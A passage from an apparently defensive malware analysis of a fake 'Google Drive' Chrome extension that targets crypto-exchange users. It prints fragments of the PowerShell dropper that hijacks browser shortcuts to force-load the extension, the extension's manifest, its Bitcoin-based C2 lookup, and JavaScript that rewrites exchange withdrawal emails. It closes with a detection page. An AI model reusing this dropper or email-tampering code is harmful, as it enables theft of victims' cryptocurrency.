</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$item</span> <span class="k">in</span> <span class="nv">$encodedData</span><span class="p">.</span><span class="py">GetEnumerator</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$decodedContent</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$item</span><span class="p">.</span><span class="n">Value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filePath</span> <span class="p">=</span> <span class="nb">Join-Path</span> <span class="nv">$destination</span> <span class="nv">$item</span><span class="p">.</span><span class="py">Key</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$directoryPath</span> <span class="p">=</span> <span class="nb">Split-Path</span> <span class="nv">$filePath</span> <span class="n">-Parent</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">-not</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$directoryPath</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">New-Item</span> <span class="nv">$directoryPath</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">,</span> <span class="nv">$decodedContent</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$startMenuPrograms</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="nv">$strangeDesktop</span><span class="s2">&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="nv">$userProfile</span><span class="s2">\Desktop&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;</span><span class="nv">$appData</span><span class="s2">\Microsoft\Internet Explorer\Quick Launch&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$braveWorkingFolder</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$programFiles</span><span class="s2">\BraveSoftware\Brave-Browser\Application&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$chromeWorkingFolder</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$programFiles</span><span class="s2">\Google\Chrome\Application&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$operaGXWorkingFolder</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$localAppData</span><span class="s2">\Programs\Opera GX&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$extensionPath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$localAppData</span><span class="s2">\Default&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$shell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="py">Shell</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="nv">$startMenuPrograms</span> <span class="n">-Filter</span> <span class="p">*.</span><span class="n">lnk</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">    <span class="nb">Where-Object</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="p">=</span> <span class="nv">$shell</span><span class="p">.</span><span class="py">CreateShortcut</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span><span class="p">.</span><span class="py">WorkingDirectory</span> <span class="o">-eq</span> <span class="nv">$braveWorkingFolder</span> <span class="o">-or</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span><span class="p">.</span><span class="py">WorkingDirectory</span> <span class="o">-eq</span> <span class="nv">$chromeWorkingFolder</span> <span class="o">-or</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span><span class="p">.</span><span class="py">WorkingDirectory</span> <span class="o">-eq</span> <span class="nv">$operaGXWorkingFolder</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">    <span class="nb">ForEach-Object</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span> <span class="p">=</span> <span class="nv">$shell</span><span class="p">.</span><span class="py">CreateShortcut</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span><span class="p">.</span><span class="py">Arguments</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="p">$(</span><span class="nv">$link</span><span class="p">.</span><span class="n">Arguments</span><span class="p">)</span><span class="s2"> --load-extension=</span><span class="se">`&#34;</span><span class="nv">$extensionPath</span><span class="se">`&#34;</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$link</span><span class="p">.</span><span class="py">Save</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Stop-Process</span> <span class="n">-Name</span> <span class="s2">&#34;chrome&#34;</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">Stop-Process</span> <span class="n">-Name</span> <span class="s2">&#34;opera&#34;</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl"><span class="nb">Stop-Process</span> <span class="n">-Name</span> <span class="s2">&#34;brave&#34;</span> <span class="n">-Force</span>
</span></span></code></pre></div><h2 id="the-victims-browser-extension-google-drive">The victim&rsquo;s browser extension: Google Drive</h2>
<p>We believe the extension that gets dropped and loaded into Chrome is directly related to the market. It poses itself as Google Drive, as can been seen in its <code>manifest.json</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;offline_enabled&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;Google Drive&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;author&#34;</span><span class="p">:</span> <span class="s2">&#34;Google inc.&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;Google Drive: create, share and keep all your stuff in one place.&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;1.8.7&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;icons&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;128&#34;</span><span class="p">:</span> <span class="s2">&#34;ico.png&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;permissions&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;scripting&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;webNavigation&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;system.cpu&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;system.display&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;system.storage&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;system.memory&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;management&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;storage&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cookies&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;notifications&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tabs&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;history&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;webRequest&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;declarativeNetRequest&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;alarms&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;manifest_version&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;background&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;service_worker&#34;</span><span class="p">:</span> <span class="s2">&#34;./src/background.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;module&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;host_permissions&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&lt;all_urls&gt;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;content_scripts&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;matches&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&lt;all_urls&gt;&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">],</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;all_frames&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;js&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;src/content/main.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;src/mails/gmail.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;src/mails/hotmail.js&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;src/mails/yahoo.js&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">],</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;run_at&#34;</span><span class="p">:</span> <span class="s2">&#34;document_start&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;declarative_net_request&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;rule_resources&#34;</span><span class="p">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;disable-csp&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;enabled&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;rules.json&#34;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>It injects several content scripts and it declares some rewrite rules that disable the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a>. The extension itself consists of multiple JavaScript files, for which no effort was made to obfuscate them. Let&rsquo;s look a little closer to its features. Below you can see a file listing of the extension, which already paints a picture of what to expect:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ find . -type f
</span></span><span class="line"><span class="cl">./config.js
</span></span><span class="line"><span class="cl">./ico.png
</span></span><span class="line"><span class="cl">./rules.json
</span></span><span class="line"><span class="cl">./manifest.json
</span></span><span class="line"><span class="cl">./app.html
</span></span><span class="line"><span class="cl">./modules/content-scripts-register-polyfill.4.0.0.js
</span></span><span class="line"><span class="cl">./src/mails/yahoo.js
</span></span><span class="line"><span class="cl">./src/mails/hotmail.js
</span></span><span class="line"><span class="cl">./src/mails/gmail.js
</span></span><span class="line"><span class="cl">./src/background.js
</span></span><span class="line"><span class="cl">./src/content/main.js
</span></span><span class="line"><span class="cl">./src/functions/proxy.js
</span></span><span class="line"><span class="cl">./src/functions/csp.js
</span></span><span class="line"><span class="cl">./src/functions/exchangeSettings.js
</span></span><span class="line"><span class="cl">./src/functions/tabs.js
</span></span><span class="line"><span class="cl">./src/functions/sentry.js
</span></span><span class="line"><span class="cl">./src/functions/screenshot.js
</span></span><span class="line"><span class="cl">./src/functions/commands.js
</span></span><span class="line"><span class="cl">./src/functions/utils.js
</span></span><span class="line"><span class="cl">./src/functions/getMachineInfo.js
</span></span><span class="line"><span class="cl">./src/functions/extensions.js
</span></span><span class="line"><span class="cl">./src/functions/notifications.js
</span></span><span class="line"><span class="cl">./src/functions/settings.js
</span></span><span class="line"><span class="cl">./src/functions/injections.js
</span></span></code></pre></div><p>Somewhat surprisingly, the discovered extension includes the Sentry.io analytics service using the following URL:</p>
<pre tabindex="0"><code>https://c8fc9104534a411a83cbe61b6d912083@o4504639317803008.ingest.sentry[.]io/4504639321407488
</code></pre><p>In a later version of the extension we analysed, this reference was removed.</p>
<h3 id="command-and-control">Command and Control</h3>
<p>The first thing we noticed was how it determines its C2 server. For this it relied on monitoring outgoing transactions from a single Bitcoin address (<code>bc1qtms60m4fxhp5v229kfxwd3xruu48c4a0tqwafu</code>), using the JSON API of <a href="https://blockchain.info/address/bc1qtms60m4fxhp5v229kfxwd3xruu48c4a0tqwafu">blockchain.info</a>. This address has made a single transaction, to a legacy Bitcoin address <code>1C56HRwPBaatfeUPEYZUCH4h53CoDczGyF</code>. This address can be Base58 decoded, resulting in the domain <code>you-rabbit[.]com</code>. This host is then contacted as the C2 server.</p>
<p>Since this transaction took place on February 6th 2023, prior infections must have used either a different technique, or relied on a different Bitcoin address to determine its C2 host. For this we downloaded a copy of the Bitcoin transaction database from January and decoded all legacy addresses to see if we could find any similar addresses, but this did not result in any matches. This could indicate that this was a new technique they just adopted in the last few months.</p>
<h3 id="oh-no-there-is-something-wrong-with-my-bitcoin-wallet">Oh no! There is something wrong with my Bitcoin wallet</h3>
<p>One of the things the extensions monitors for is emails you might receive from various crypto exchanges. If so, it rewrites the email, to make them look less suspicious. For example, changing an email about a withdrawal into an email about a new sign-in:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;mail.google&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">binance</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">items</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;:contains(&#34;Withdrawal Requested&#34;)&#39;</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">children</span><span class="p">().</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">$</span><span class="p">(</span><span class="nx">item</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="sb">`[Binance] Authorize New Device`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">items</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;span:contains(&#34;Memo:&#34;)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">$</span><span class="p">(</span><span class="nx">item</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="sb">`&lt;span class=&#34;Zt&#34;&gt;&amp;nbsp;-&amp;nbsp;&lt;/span&gt;Authorize New Device You recently attempted to sign in to your Binance account from a new device or location. As a security measure, we require additional confi.`</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">items</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;div:contains(&#34;Memo:&#34;)&#39;</span><span class="p">).</span><span class="nx">filter</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">children</span><span class="p">().</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">})[</span><span class="mi">0</span><span class="p">]).</span><span class="nx">parents</span><span class="p">(</span><span class="s1">&#39;.ii&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kr">const</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="nx">item</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;div[style*=&#34;font-size:20px&#34;]&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]).</span><span class="nx">find</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">$</span><span class="p">(</span><span class="nx">item</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">&#39;...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>They have support for Gmail, Hotmail/Outlook and Yahoo and seem to monitor emails from Binance, Bybit, Huobi, Okx, Kraken, KuCoin and Bittrex.</p>
<p>Since they don&rsquo;t actually check for the domain name, but rather if e.g. &lsquo;mail.google&rsquo; is present somewhere in the URL, we can use this to detect if an user is infected with this extension:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;mail.google+outlook.live+yahoo&#34;</span><span class="p">)</span> <span class="o">===</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">+</span> <span class="s2">&#34;#scan=mail.google+outlook.live+yahoo&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="nx">analyze</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">checks</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// The + is needed to avoid this element itself being modified!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;binance&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;Withdrawal &#34;</span> <span class="o">+</span> <span class="s2">&#34;Requested&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;huobi&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;Подтвердите &#34;</span> <span class="o">+</span> <span class="s2">&#34;запрос на вывод средств&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;okx&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;Verification &#34;</span> <span class="o">+</span> <span class="s2">&#34;Code Of Withdrawal&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;kraken&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;Confirm &#34;</span> <span class="o">+</span> <span class="s2">&#34;your new withdrawal address&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;kucoin&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;KuCoin &#34;</span> <span class="o">+</span> <span class="s2">&#34;Verification Code&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;bitget&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;Add &#34;</span> <span class="o">+</span> <span class="s2">&#34;withdrawal address&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">checks</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;bittrex&#34;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">!==</span> <span class="s2">&#34;Please &#34;</span> <span class="o">+</span> <span class="s2">&#34;Confirm Your Withdrawal&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">found</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nx">i</span> <span class="k">in</span> <span class="nx">checks</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">checks</span><span class="p">[</span><span class="nx">i</span><span class="p">])</span> <span class="nx">found</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nx">found</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;result&#39;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="s2">&#34;Good news! The malicious browser extension was not detected.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;result&#39;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;Bad news! We also detected this extension on your system. We would advice you to go to the website of the &lt;a href=&#39;https://politie.nl/checkyourhack&#39;&gt;Dutch police&lt;/a&gt;, where they can assist you further.&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="mi">2000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;binance&#34;</span><span class="p">&gt;</span>Withdrawal Requested<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;huobi&#34;</span><span class="p">&gt;</span>Подтвердите запрос на вывод средств<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;okx&#34;</span><span class="p">&gt;</span>Verification Code Of Withdrawal<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;kraken&#34;</span><span class="p">&gt;</span>Confirm your new withdrawal address<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: none;&#34;</span><span class="na">id</span><span class="o">=</span><span class="s">&#34;kucoin&#34;</span><span class="p">&gt;</span>KuCoin Verification Code<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
